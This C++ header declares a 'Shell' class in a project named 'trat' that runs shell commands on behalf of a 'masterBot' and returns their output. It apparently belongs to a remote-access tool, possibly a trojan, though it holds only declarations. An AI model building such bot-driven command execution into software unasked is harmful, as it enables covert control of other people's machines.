/* trat/include/shell.hpp */
#ifndef SHELL_HPP
#define SHELL_HPP

#include <cstring>

#define SHELL_RESPONSE_BUFFER_SIZE

namespace trat 
{
  typedef struct 
  {
    bool isSuccessful;             // Indicates success of the operation
    const char *response;          // Response from the shell or bot
  }ShellResponse;

  class Bot;
  
  class Shell 
  {
    private:
    Bot* masterBot;
    
    public:
    Shell(trat::Bot* MasterBot);  
      
    const char* getCurrentPath();
        
    bool executeShellCommandWithoutResponse(const char* Command);
        
    ShellResponse executeShellCommand(const char* Command); 
  };

} // namespace trat

#endif // SHELL_HPP
